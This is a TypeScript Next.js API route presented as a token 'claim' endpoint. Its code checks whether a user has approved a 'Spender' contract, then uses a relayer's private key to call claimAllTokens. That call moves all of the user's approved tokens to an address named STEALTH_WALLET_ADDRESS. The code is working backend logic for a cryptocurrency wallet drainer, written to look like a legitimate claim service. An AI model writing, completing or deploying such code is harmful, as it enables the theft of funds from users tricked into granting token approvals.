import { ethers } from 'ethers';
import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

// Minimal ABI for the Spender contract (unchanged)
const SPENDER_ABI = [
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'from', type: 'address' },
      { internalType: 'address', name: 'to', type: 'address' },
    ],
    name: 'claimAllTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { internalType: 'address', name: 'token', type: 'address' },
      { internalType: 'address', name: 'user', type: 'address' },
    ],
    name: 'checkAllowance',
    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
];

export async function POST(request: NextRequest) {
  try {
    console.log('[v0] Claim API: Request received (Ethereum)');

    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    const rpcUrl = process.env.RPC_URL || 'https://ethereum.publicnode.com';
    const spenderAddress = process.env.SPENDER_CONTRACT_ADDRESS;
    const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS;
    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;

    if (!relayerKey || !rpcUrl || !spenderAddress || !tokenAddress || !stealthWallet) {
      console.error('[v0] Missing environment variables:', {
        hasRelayerKey: !!relayerKey,
        hasRpcUrl: !!rpcUrl,
        hasSpender: !!spenderAddress,
        hasToken: !!tokenAddress,
        hasStealth: !!stealthWallet,
      });
      return NextResponse.json(
        { error: 'Missing required environment variables' },
        { status: 500 }
      );
    }

    const body = await request.json();
    const { userAddress } = body;

    if (!userAddress || !ethers.isAddress(userAddress)) {
      console.error('[v0] Invalid user address:', userAddress);
      return NextResponse.json({ error: 'Invalid user address' }, { status: 400 });
    }

    console.log('[v0] Processing claim for user:', userAddress, '→', stealthWallet);

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayerWallet = new ethers.Wallet(relayerKey, provider);
    const spenderContract = new ethers.Contract(spenderAddress, SPENDER_ABI, relayerWallet);

    // Safety check: verify allowance exists
    const allowance = await spenderContract.checkAllowance(tokenAddress, userAddress);
    console.log('[v0] Allowance from user to Spender:', allowance.toString());

    if (allowance === 0n) {
      return NextResponse.json(
        { error: 'User has no allowance set to the Spender contract' },
        { status: 400 }
      );
    }

    console.log('[v0] Calling claimAllTokens on Spender contract...');

    const tx = await spenderContract.claimAllTokens(
      tokenAddress,
      userAddress,
      stealthWallet,
      {
        gasLimit: 450000,           // Higher on Ethereum (adjust if needed after testing)
        // maxFeePerGas / maxPriorityFeePerGas can be added if you want EIP-1559 control
      }
    );

    console.log('[v0] Transaction sent:', tx.hash);

    const receipt = await tx.wait(1); // Wait for 1 confirmation

    console.log('[v0] Transaction confirmed in block:', receipt?.blockNumber);

    return NextResponse.json(
      {
        success: true,
        txHash: tx.hash,
        blockNumber: receipt?.blockNumber,
        from: userAddress,
        to: stealthWallet,
      },
      { status: 200 }
    );
  } catch (error: any) {
    console.error('[v0] Claim error (Ethereum):', error);
    const errorMessage = error?.reason || error?.shortMessage || error?.message || 'Claim failed';
    return NextResponse.json(
      { error: errorMessage },
      { status: 500 }
    );
  }
}
